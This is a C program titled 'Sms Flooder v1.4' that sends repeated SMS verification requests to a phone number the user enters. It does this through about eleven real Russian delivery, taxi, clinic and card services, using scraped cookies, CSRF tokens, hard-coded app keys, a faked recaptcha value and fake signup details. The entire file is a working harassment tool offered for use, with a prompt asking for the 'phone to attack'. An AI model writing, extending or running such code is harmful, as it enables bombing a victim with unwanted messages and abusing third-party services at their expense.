/*  Sms Flooder v1.4
 *  linux basic template
 *  gcc sms-flooder.c -lcurl
 *  ./sms-flooder
*/

#include <stdio.h>      // stdio.h
#include <stdlib.h>     // for rend();
#include <curl/curl.h>  // for curl;
#include <unistd.h>     // for sleep();

/* Get randon int */
int GetRandInt (int min, int max){
    int r;
    srand(time(NULL));
    r = rand();
    if (r < 0) r*=-1;
    r%=max+min;
    return r;
}

/* Delivery-club Get Cookie + Sms Flood func*/
void SmsDelevery(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step1 - get cookie and save in in a delivery-cookie.txt */
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.delivery-club.ru/api1.2/user/login");
        chunk = curl_slist_append(chunk, "Host: api.delivery-club.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIE, "mr1lad=undefined; mr1luid=undefined; mr1lext=undefined");
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./delivery-cookie.txt");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
    
        /* Perform the request, res will get the return code */
        res = curl_easy_perform(curl);
        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        chunk = NULL;

        /* Step2 - Post reqquest with cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.delivery-club.ru/api1.2/user/otp");
        chunk = curl_slist_append(chunk, "Host: api.delivery-club.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: multipart/form-data; boundary=---------------------------18803091494160019601289726221");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./delivery-cookie.txt");
        
        /* Buffer for POST data with phone number*/
        sprintf(Buf, "-----------------------------18803091494160019601289726221\nContent-Disposition: form-data; name=\"phone\"\n\n%s\n-----------------------------18803091494160019601289726221--\n", phone);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        /* always cleanup */
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

}

/* Dostaevsky-food Get cookie func */
void GetCookieDostaevsky() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step1 - Get cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://msk.dostaevsky.ru/");
        chunk = curl_slist_append(chunk, "Host: msk.dostaevsky.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./dostaevsky-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

/* Dostaevsky-food Sms Flood func*/
void SmsDostaevsky(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512];
    char token[128];
    int f=0;

    /* Get token to post data from cookie-file*/
    FILE *file;
    file = fopen("./dostaevsky-cookie.txt", "r");

    while (fscanf (file, "%s", token) != EOF) {
        if (f==1) break;
        if (!strcmp(token, "XSRF-TOKEN")) f=1;
	}
    fclose(file);

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step2 - Post reqquest with cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://msk.dostaevsky.ru/auth/send-sms");
        chunk = curl_slist_append(chunk, "Host: msk.dostaevsky.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: */*");
        chunk = curl_slist_append(chunk, "Content-type: application/x-www-form-urlencoded; charset=UTF-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./dostaevsky-cookie.txt");

        /* Buffer for POST data with phone number*/
        sprintf(Buf, "phone=+%c %c%c%c %c%c%c-%c%c-%c%c&_token=%s", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10], token);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        /* always cleanup */
        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* Ollis Sms Flood func*/
void SmsOllis(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step2 - Post reqquest with cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://www.ollis.ru/gql");
        chunk = curl_slist_append(chunk, "Host: www.ollis.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);

        sprintf(Buf, "{\"query\":\"mutation { phone(number:\\\"%s\\\", locale:ru) { token error { code message } } }\"}", phone);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* M-food sms funk*/
void SmsMfood(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Post reqquest */
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.crm.p-group.ru/checkout/login");
        chunk = curl_slist_append(chunk, "Host: api.crm.p-group.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
        // What is x-keypass?
        chunk = curl_slist_append(chunk, "x-keypass: lebfgiuDaeEYiou2%3255$208@{wdw{]}");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        // How to work recaptchaToken?
        sprintf(Buf, "{\"departmentId\":3,\"regionId\":2,\"phone\":\"%s\",\"recaptchaToken\":\"%d\"}", phone, GetRandInt(500, 10000));
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* Taxovichkof Get Cookie funk */
void GetCookieTaxovichkof() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://taxovichkof.ru/user/login");
        chunk = curl_slist_append(chunk, "Host: taxovichkof.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./taxovichkof-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

/* Taxovichkof Sms Flood func (!Have a timer on 5 minuts)*/
void SmsTaxovichkof(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://taxovichkof.ru/user/register");
        chunk = curl_slist_append(chunk, "Host: taxovichkof.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./taxovichkof-cookie.txt");

        sprintf(Buf, "Users%%5Busername%%5D=%%2B%c+(%c%c%c)+%c%c%c-%c%c%c%c&Users%%5Bpassword%%5D=", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* Dvepalochki Get Cookie funk */
void GetCookieDvepalochki() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://dostavka.dvepalochki.ru/catalog/nabory_sushi");
        chunk = curl_slist_append(chunk, "Host: dostavka.dvepalochki.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./dvepalochki-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

/* Dvepalochki Sms Flood func */
void SmsDvepalochki(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[256];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://dostavka.dvepalochki.ru/local/ajax/auth.php");
        chunk = curl_slist_append(chunk, "Host: dostavka.dvepalochki.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/javascript, */*; q=0.01");
        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./dvepalochki-cookie.txt");

        sprintf(Buf, "ajaxSendSMS=Y&phone=%%2B%c+(%c%c%c)+%c%c%c-%c%c-%c%c", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* Evrasia Get Cookie funk */
void GetCookieEvrasia() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://evrasia.spb.ru/signup/");
        chunk = curl_slist_append(chunk, "Host: evrasia.spb.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./evrasia-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

/* Evrasia Sms Flood func (!one sms only:( ))*/
void SmsEvrasia(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://evrasia.spb.ru/signup/");
        chunk = curl_slist_append(chunk, "Host: evrasia.spb.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./evrasia-cookie.txt");

        sprintf(Buf, "name=Sam&username=%%2B%c+%%28%c%c%c%%29+%c%c%c-%c%c-%c%c&mail=Q%dSW%%40gmail.com&bday=05%%2F11%%2F1998&dispatch1=sms&PERSONAL_GENDER=M&pers_data=yes", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10], GetRandInt(1, 1437));
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* Plazius Sms Flood func (!what is Appkey?)*/
void SmsPlazius(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[128];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://app.plazius.ru/api/mobile/v3/auth/sendSms");
        chunk = curl_slist_append(chunk, "Host: app.plazius.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
        chunk = curl_slist_append(chunk, "AppKey: WebApp-3a2605b0cf2a4c9d938752a84b7e97b6");
        chunk = curl_slist_append(chunk, "Token: [object Object]");
        chunk = curl_slist_append(chunk, "userid: [object Object]");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        sprintf(Buf, "{\"userPhone\":\"+%s\"}", phone);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* PersonaClinic Get Cookie funk */
void GetCookiePersonaClinic() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.personaclinic.ru/?register=yes");
        chunk = curl_slist_append(chunk, "Host: lk.personaclinic.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./personaClinic-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

/* PersonaClinic Sms Flood func (!one sms only:?)*/
void SmsPersonaClinic(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[256];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.personaclinic.ru/local/templates/lk/components/bitrix/system.auth.registration/.default/ajax/phone.php");
        chunk = curl_slist_append(chunk, "Host: lk.personaclinic.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./personaClinic-cookie.txt");

        sprintf(Buf, "REG_PHONE=%%2B%c+(%c%c%c)+%c%c%c-%c%c-%c%c", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* StrelkaCard Get Cookie funk */
void GetCookieStrelkaCard() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.strelkacard.ru/register/");
        chunk = curl_slist_append(chunk, "Host: lk.strelkacard.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./strelkaCard-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

/* StrelkaCard Sms Flood func (!one sms only:?)*/
void SmsStrelkaCard(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[128];

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://lk.strelkacard.ru/api/users/register/");
        chunk = curl_slist_append(chunk, "Host: lk.strelkacard.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./strelkaCard-cookie.txt");

        sprintf(Buf, "{\"phone\":\"%s\"}", phone);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* Driver Get Cookie funk */
void GetCookieDriver() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://driver.gett.ru/signup/");
        chunk = curl_slist_append(chunk, "Host: driver.gett.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./driver-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

/* Driver Sms Flood func (!one sms only:?)*/
void SmsDriver(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[256];
    char token[128];
    int f=0;

    FILE *file;
    file = fopen("./driver-cookie.txt", "r");

    while (fscanf (file, "%s", token) != EOF) {
        if (f==1) break;
        if (!strcmp(token, "XSRF-TOKEN")) f=1;
	}
    fclose(file);

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        curl_easy_setopt(curl, CURLOPT_URL, "https://driver.gett.ru/api/login/phone/");
        chunk = curl_slist_append(chunk, "Host: driver.gett.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "'Accept: application/json");
        chunk = curl_slist_append(chunk, "Content-Type: application/json");
        
        sprintf(Buf, "X-CSRFToken: %s", token);
        chunk = curl_slist_append(chunk, Buf);
        
        chunk = curl_slist_append(chunk, "Referer: https://driver.gett.ru/signup/");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./driver-cookie.txt");
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        sprintf(Buf, "{\"phone\":\"+%c (%c%c%c) %c%c%c-%c%c-%c%c\",\"registration\":true}", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

int main(void)
{
    char phone[16];
    int rounds;

    // Print Banner
    printf("\n\t------------------------\n\t|  Sms Flooder v1.4    |\n\t|----------------------|\n");
    printf("\t| Developed by mrTavas |\n\t------------------------\n");
    printf("\n[?] Number format: 79999999999\n");
    printf("[?] Rounds example: 1\n");
    printf("\n[*] Started...\n[?] Phone to attck -> ");
    scanf("%s", phone);
    printf("[?] Rounds -> ");
    scanf("%d", &rounds);
    if (rounds == 0) return 0;

    /* Get cookies */
    GetCookieDostaevsky();
    GetCookieTaxovichkof();
    GetCookieDvepalochki();
    GetCookieEvrasia();
    GetCookiePersonaClinic();
    GetCookieStrelkaCard();
    GetCookieDriver();
    system("clear");

    /* Starting Flood */
    for (int i = 1; i <= rounds; i++) {
        SmsDelevery(phone);
        sleep(2);
        SmsDostaevsky(phone);
        sleep(2);
        SmsOllis(phone);
        sleep(2);
        SmsMfood(phone);
        sleep(1);
        SmsTaxovichkof(phone);      // (!5 min timer)
        sleep(2);
        SmsDvepalochki(phone);
        sleep(2);
        SmsEvrasia(phone);          // (!one sms only)
        sleep(2);
        SmsPlazius(phone);          // (!what is Appkey?)
        sleep(1);
        SmsPersonaClinic(phone);    // (!one sms only?)
        sleep(2);
        SmsStrelkaCard(phone);      // (!one sms only?)
        sleep(1);
        SmsDriver(phone);

        system("clear");
        printf("\n[+] Round %d done\n", i);
        sleep(10);
    }

    printf("[+] %d Rounds done. Have a nice day!\n\n", rounds);
    return 0;
}
